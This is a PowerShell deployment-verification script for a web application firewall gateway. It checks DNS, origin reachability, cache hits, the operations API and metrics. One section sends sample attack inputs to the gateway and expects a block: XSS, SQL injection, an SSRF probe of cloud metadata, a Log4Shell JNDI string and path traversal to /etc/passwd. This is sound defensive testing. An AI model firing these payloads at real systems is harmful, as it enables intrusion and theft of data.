param(
    [string]$Config = "",
    [string]$EnvFile = "",
    [string]$EdgeProxyEnvFile = "",
    [switch]$NoEnv,
    [string]$Domain = "",
    [string]$DnsServer = "",
    [string]$ExpectedIngressIP = "",
    [string]$OriginHost = "",
    [int]$OriginPort = 0,
    [string]$AdminUrl = "",
    [string]$Token = ""
)

$ErrorActionPreference = "Stop"
if ($NoEnv -and ($EnvFile -or $EdgeProxyEnvFile)) { throw "Environment-file parameters and -NoEnv cannot be used together." }
. "$PSScriptRoot\dotenv.ps1"

$configEnvironmentPreexisting = $null -ne (Get-Item -LiteralPath Env:SECURITYEDGE_CONFIG -ErrorAction SilentlyContinue)
$loadedSecurityEnv = $null
if (-not $NoEnv) {
    $explicitSecurityEnv = if ($EnvFile) { $EnvFile } else { Get-NonEmptyEnvironmentValue SECURITYEDGE_ENV_FILE }
    $loadedSecurityEnv = Import-ApplicationDotEnv -ExplicitPath $explicitSecurityEnv -Candidates @((Join-Path $PSScriptRoot "..\.env"))
    if ($loadedSecurityEnv) { Write-Host "Loaded SecurityEdge environment: $loadedSecurityEnv" -ForegroundColor DarkGray }

    $explicitEdgeEnv = if ($EdgeProxyEnvFile) { $EdgeProxyEnvFile } else { Get-NonEmptyEnvironmentValue EDGEPROXY_ENV_FILE }
    $loadedEdgeEnv = Import-ApplicationDotEnv -ExplicitPath $explicitEdgeEnv -Candidates @((Join-Path $PSScriptRoot "..\..\edgeproxy\.env"))
    if ($loadedEdgeEnv) { Write-Host "Loaded EdgeProxy environment: $loadedEdgeEnv" -ForegroundColor DarkGray }
}

$configPath = Resolve-EffectiveConfigPath -ExplicitValue $Config -EnvironmentVariable SECURITYEDGE_CONFIG `
    -EnvironmentWasPreexisting $configEnvironmentPreexisting -LoadedEnvPath $loadedSecurityEnv `
    -Candidates @((Join-Path $PSScriptRoot "..\configs\securityedge.json"))
if (-not (Test-Path -LiteralPath $configPath -PathType Leaf)) { throw "Configuration file not found: $configPath" }
$configPath = (Resolve-Path -LiteralPath $configPath).Path
$configObject = Get-Content $configPath -Raw | ConvertFrom-Json
$configObject = Apply-SecurityEdgeEnvironmentOverrides -ConfigObject $configObject

function Section([string]$Text) { Write-Host "`n=== $Text ===" -ForegroundColor Cyan }
function Assert([bool]$Condition, [string]$Message) {
    if (-not $Condition) { throw $Message }
    Write-Host "[OK] $Message" -ForegroundColor Green
}
function Port-FromListen([string]$Address) {
    if ($Address -notmatch ':(\d+)$') { throw "Invalid listen address: $Address" }
    return [int]$Matches[1]
}
function Host-FromEndpoint([string]$Endpoint) {
    $value = $Endpoint.Trim()
    if ($value -match '^\[([^\]]+)\]:(\d+)$') { return $Matches[1] }
    if ($value -match '^(.+):(\d+)$') { return $Matches[1] }
    return $value.Trim('[', ']')
}
function Local-UrlFromListen([string]$Address) {
    $port = Port-FromListen $Address
    return "http://127.0.0.1:$port"
}
function Invoke-Probe([string]$Url, [string[]]$ExtraArgs = @()) {
    $headerFile = [IO.Path]::GetTempFileName()
    $bodyFile = [IO.Path]::GetTempFileName()
    try {
        $status = & curl.exe -sS -D $headerFile -o $bodyFile -w "%{http_code}" @ExtraArgs $Url
        if ($LASTEXITCODE -ne 0) { throw "curl failed for $Url" }
        [pscustomobject]@{
            Status  = [int]$status
            Headers = Get-Content $headerFile -Raw
            Body    = Get-Content $bodyFile -Raw
        }
    }
    finally { Remove-Item $headerFile, $bodyFile -Force -ErrorAction SilentlyContinue }
}

$dnsConfig = $configObject.admin.connectivity.dns
if (-not $Domain -and $dnsConfig.names.Count -gt 0) { $Domain = [string]$dnsConfig.names[0] }
if (-not $DnsServer -and $dnsConfig.server) { $DnsServer = Host-FromEndpoint ([string]$dnsConfig.server) }
if (-not $ExpectedIngressIP -and $dnsConfig.expected_addresses.Count -gt 0) { $ExpectedIngressIP = [string]$dnsConfig.expected_addresses[0] }
if (-not $AdminUrl) { $AdminUrl = Local-UrlFromListen ([string]$configObject.admin.listen_addr) }
if (-not $Token) { $Token = [string]$configObject.admin.auth_token }

$edgeConfigRelative = [string]$configObject.edgeproxy.config_path
$edgeConfigPath = if ([IO.Path]::IsPathRooted($edgeConfigRelative)) {
    [IO.Path]::GetFullPath($edgeConfigRelative)
}
else {
    [IO.Path]::GetFullPath((Join-Path (Split-Path $configPath) $edgeConfigRelative))
}
if (-not (Test-Path -LiteralPath $edgeConfigPath -PathType Leaf)) { throw "Referenced EdgeProxy configuration not found: $edgeConfigPath" }
$edgeConfig = Get-Content $edgeConfigPath -Raw | ConvertFrom-Json
$edgeConfig = Apply-EdgeProxyEnvironmentOverrides -ConfigObject $edgeConfig
if (-not $Domain) {
    $Domain = @($edgeConfig.routes[0].hosts | Where-Object { $_ -notin @("localhost", "127.0.0.1", "*") })[0]
}
$originUri = [Uri]$edgeConfig.routes[0].upstreams[0].url
if (-not $OriginHost) { $OriginHost = $originUri.Host }
if ($OriginPort -eq 0) { $OriginPort = $originUri.Port }
$edgeDataUrl = ([string]$configObject.server.upstream_proxy_url).TrimEnd('/')
$ingressPort = Port-FromListen ([string]$configObject.server.listen_addr)
$publicBaseUrl = if ($ingressPort -eq 80) { "http://$Domain" } else { "http://${Domain}:$ingressPort" }

Section "Configuration contract"
Assert ($configObject.server.mode -eq "gateway") "Deployment profile uses standalone gateway mode"
Assert (Test-Path $edgeConfigPath) "Referenced EdgeProxy configuration exists"
Write-Host "SecurityEdge ingress: $($configObject.server.listen_addr)"
Write-Host "EdgeProxy data plane: $edgeDataUrl"
Write-Host "Operations API: $AdminUrl"
Write-Host "Origin: ${OriginHost}:$OriginPort"

if ($dnsConfig.enabled) {
    Section "DNS resolution"
    Assert (-not [string]::IsNullOrWhiteSpace($Domain)) "A monitored hostname is configured"
    Assert (-not [string]::IsNullOrWhiteSpace($DnsServer)) "A DNS resolver endpoint is configured"
    $addresses = @(Resolve-DnsName -Name $Domain -Server $DnsServer -Type A -ErrorAction Stop |
        Where-Object Type -eq "A" |
        Select-Object -ExpandProperty IPAddress)
    $addresses | ForEach-Object { Write-Host "$Domain -> $_" }
    if ($ExpectedIngressIP) {
        Assert ($addresses -contains $ExpectedIngressIP) "The resolver returns the configured ingress address $ExpectedIngressIP"
    }
}
else {
    Section "DNS resolution"
    Write-Host "DNS probing is disabled in this profile; DNS is not included in the internal connectivity snapshot." -ForegroundColor Yellow
}

Section "Gateway-to-Origin access"
$origin = Test-NetConnection -ComputerName $OriginHost -Port $OriginPort -WarningAction SilentlyContinue
Assert $origin.TcpTestSucceeded "The gateway host can reach Origin at ${OriginHost}:$OriginPort"

Section "Listener exposure"
& "$PSScriptRoot\check-listeners.ps1" -Config $configPath -NoEnv
if ($LASTEXITCODE -ne 0) { throw "Listener exposure validation failed with exit code $LASTEXITCODE" }

Section "EdgeProxy internal health"
$edgeHealth = Invoke-Probe "$edgeDataUrl/healthz" @("-H", "Host: $Domain")
Assert ($edgeHealth.Status -eq 200) "EdgeProxy loopback health returns HTTP 200"

Section "Clean request and cache"
$nonce = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
$url = "$publicBaseUrl/verification?run=$nonce"
$first = Invoke-Probe $url
$second = Invoke-Probe $url
Assert ($first.Status -eq 200) "First clean request returns HTTP 200"
Assert ($first.Headers -match '(?im)^X-Security-Action:\s*ALLOW\s*$') "SecurityEdge allows the clean request"
Assert ($first.Headers -match '(?im)^X-Cache:\s*MISS\s*$') "First request is an EdgeProxy cache MISS"
Assert ($second.Status -eq 200) "Second clean request returns HTTP 200"
Assert ($second.Headers -match '(?im)^X-Cache:\s*HIT\s*$') "Second request is an EdgeProxy cache HIT"
Assert (([regex]::Matches($second.Headers, '(?im)^X-Request-ID:')).Count -eq 1) "Response contains exactly one X-Request-ID"

Section "Representative WAF categories"
$attacks = @(
    @{ Name = "XSS"; Url = "$publicBaseUrl/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E" },
    @{ Name = "SQL injection"; Url = "$publicBaseUrl/login?username=admin%27%20OR%201%3D1--" },
    @{ Name = "SSRF"; Url = "$publicBaseUrl/fetch?url=http://169.254.169.254/latest/meta-data" },
    @{ Name = "Log4Shell/JNDI"; Url = "$publicBaseUrl/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D" },
    @{ Name = "Path traversal"; Url = "$publicBaseUrl/download?file=..%2F..%2Fetc%2Fpasswd" }
)
foreach ($attack in $attacks) {
    $response = Invoke-Probe $attack.Url
    Assert ($response.Status -eq 403) "$($attack.Name) is blocked with HTTP 403"
}

Section "Operations API, connectivity, metrics, and privacy"
$headers = @{ Authorization = "Bearer $Token" }
$info = Invoke-RestMethod "$AdminUrl/api/v1/info" -Headers $headers
Assert ($info.build.name -eq "SecurityEdge") "Operations API exposes build identity"
$status = Invoke-RestMethod "$AdminUrl/api/v1/status" -Headers $headers
Assert ($status.edgeproxy.reachable -eq $true) "SecurityEdge can reach the EdgeProxy Admin API"
$connectivity = Invoke-RestMethod "$AdminUrl/api/v1/connectivity/check" -Headers $headers -Method Post
Assert ($connectivity.overall_status -eq "healthy") "Service health reports overall Healthy"
Assert ($connectivity.traffic_path_status -eq "healthy") "Traffic-path dependencies are healthy"
Assert ($connectivity.edgeproxy_connection_status -eq "healthy") "EdgeProxy data and control planes are connected"
Assert ($connectivity.counts.ready_routes -eq $connectivity.counts.total_routes) "All EdgeProxy routes are ready"
Assert ($connectivity.counts.healthy_origins -eq $connectivity.counts.total_origins) "All configured origins are healthy"
if ($dnsConfig.enabled) {
    $dnsComponent = @($connectivity.components | Where-Object id -eq "dns_resolution")
    Assert ($dnsComponent.Count -eq 1 -and $dnsComponent[0].status -eq "healthy") "DNS resolution probe is healthy"
}
$metrics = Invoke-RestMethod "$AdminUrl/api/v1/metrics" -Headers $headers
Assert ($metrics.schema_version -eq "2.0") "Security metrics schema is 2.0"
$prometheus = Invoke-RestMethod "$AdminUrl/api/v1/metrics/prometheus" -Headers $headers
Assert ($prometheus -match 'securityedge_requests_total') "Prometheus exposition is available"
$logs = Invoke-RestMethod "$AdminUrl/api/v1/logs?limit=100" -Headers $headers | ConvertTo-Json -Depth 30
Assert ($logs -notmatch '<script>') "Raw XSS payload is absent from SecurityEdge logs"
Assert ($logs -notmatch '169\.254\.169\.254') "Raw SSRF target is absent from SecurityEdge logs"

Write-Host "`nAll gateway-host verification assertions passed." -ForegroundColor Green
Write-Host "Send a normal request to the public hostname from the client you are using. The Recent Client Traffic panel should update automatically; internal EdgeProxy/Admin and Origin ports must remain unreachable directly." -ForegroundColor Yellow
